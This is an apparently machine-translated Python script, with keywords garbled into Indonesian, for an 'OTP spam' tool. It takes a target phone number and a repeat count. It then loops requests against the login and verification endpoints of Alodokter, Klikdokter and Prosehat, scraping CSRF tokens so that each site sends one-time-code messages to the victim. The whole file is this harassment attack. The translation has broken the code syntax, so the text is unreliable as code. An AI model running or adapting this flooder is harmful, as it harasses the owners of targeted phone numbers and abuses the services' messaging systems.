
 permintaan impor , os , sys , waktu
dari  bs4  import  BeautifulSoup  sebagai  BS

 dokter kelas :
	def  __init__ ( sendiri ):
		diri . ses = permintaan . Sesi ()

	def  alodoc ( self , num ):
		diri . ses . header . perbarui ({ 'referer' : 'https://www.alodokter.com/login-alodokter' })
		req1 = diri . ses . dapatkan ( 'https://www.alodokter.com/login-alodokter' )
		bs1 = BS ( teks persyaratan1 . , 'html.parser' )
		token = bs1 . temukan ( 'meta' , { 'name' : 'csrf-token' }) [ 'content' ]
# cetak (token)

		head = {
			'user-agent' : 'Mozilla / 5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 72.0.3626.121 Mobile Safari / 537.36' ,
			'content-type' : 'application / json' ,
			'referer' : 'https://www.alodokter.com/login-alodokter' ,
			'accept' : 'application / json' ,
			'origin' : 'https://www.alodokter.com' ,
			'x-csrf-token' : token
		}
		req2 = diri . ses . pos ( 'https://www.alodokter.com/login-with-phone-number' , headers = head , json = { "user" : { "phone" : num }})
# print (req2.json ())
		jika  req2 . json () [ 'status' ] ==  'sukses' :
			cetak ( "[•] Berhasil" )
		lain :
			cetak ( "[-] Gagal" )

	def  klikdok ( self , num ):
		req1 = diri . ses . dapatkan ( 'https://m.klikdokter.com/users/create' )
		bs = BS ( req1 . teks , 'html.parser' )
		token = bs . temukan ( 'input' , { 'name' : '_token' }) [ 'value' ]
# cetak (token)

		head = {
			'Koneksi' : 'tetap hidup' ,
			'Cache-Control' : 'max-age = 0' ,
			'Asal' : 'https://m.klikdokter.com' ,
			'Tingkatkan-Permintaan-Tidak Aman' : '1' ,
			'Jenis-Konten' : 'application / x-www-form-urlencoded' ,
			'User-Agent' : 'Mozilla / 5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 72.0.3626.121 Mobile Safari / 537.36' ,
			'Terima' : 'text / html, application / xhtml + xml, application / xml; q = 0.9, image / webp, image / apng, * / *; q = 0.8' ,
			'Referer' : 'https://m.klikdokter.com/users/create?back-to=' ,
		}
		ata = {
			'_token' : token ,
			'full_name' : 'BambangSubianto' ,
			'email' : 'Hsjakaj@jskaka.com' ,
			'telepon' : num ,
			'kembali ke' : '' ,
			'submit' : 'Daftar' ,
		}

		req2 = diri . ses . posting ( 'https://m.klikdokter.com/users/check' , headers = head , data = ata )
# print (req2.url)
		jika  "sesi / auth? user ="  di  req2 . url :
			cetak ( "[•] Berhasil" )
		lain :
			cetak ( "[-] Gagal" )

	def  prosehat ( self , num ):
		head = {
			'accept' : 'application / json, text / javascript, * / *; q = 0,01 ' ,
			'origin' : 'https://www.prosehat.com' ,
			'x-diminta-dengan' : 'XMLHttpRequest' ,
			'user-agent' : 'Mozilla / 5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 72.0.3626.121 Mobile Safari / 537.36' ,
			'jenis konten' : 'application / x-www-form-urlencoded; charset = UTF-8 ' ,
			'referer' : 'https://www.prosehat.com/akun' ,
		}
		ata = { 'phone_or_email' : num , 'action' : 'ajaxverificationsend' }

		req = permintaan . posting ( 'https://www.prosehat.com/wp-admin/admin-ajax.php' , data = ata , headers = head )
# print (teks permintaan)
		jika  "token"  di  req . teks :
			cetak ( "[•] Berhasil" )
			untuk  x  dalam  rentang ( 60 ):
				cetak ( end = f " \ r >> Tidur { 60 - ( x + 1 ) } s <<" , flush = True )
				waktu . tidur ( 1 )
			cetak ()
		lain :
			cetak ( f "[-] Gagal { req . text } " )
			untuk  x  dalam  rentang ( 60 ):
				cetak ( end = f " \ r >> Tidur { 60 - ( x + 1 ) } s <<" , flush = True )
				waktu . tidur ( 1 )
			cetak ()

sementara  Benar :
	coba :
		os . sistem ( 'bersih' )
		cetak ( "" "
		[Tanya Dokter OTP]
		 - Oleh Kang-Newbie -
[Daftar Spam]
1. Alodokter.com
2. Klikdokter.com
3. Prosehat.com
	"" " )
		pil = int ( input ( "> Pilih:" ))
		cetak ( "=" * 25 )
		num = input ( "[?] Nomor Target:" )
		lop = int ( input ( "[?] Pendauran:" ))
		cetak ()

		main = docter ()
		jika  pil  ==  1 :
			untuk  saya  dalam  jangkauan ( lop ):
				utama . alodoc ( num )
		elif  pil  ==  2 :
			untuk  saya  dalam  jangkauan ( lop ):
				utama . klikdok ( num )
		elif  pil  ==  3 :
			untuk  saya  dalam  jangkauan ( lop ):
				utama . prosehat ( num )
		lain :
			print ( "?: Anda Buta !?" )

		lgi = input ( " \ n [?] Coba lagi (Y / n)" )
		jika  lgi . lebih rendah () ==  'n' :
			sys . keluar ( 'GOODBYE: *' )
	kecuali  Exception  as  Err :
		sys . keluar ( Err )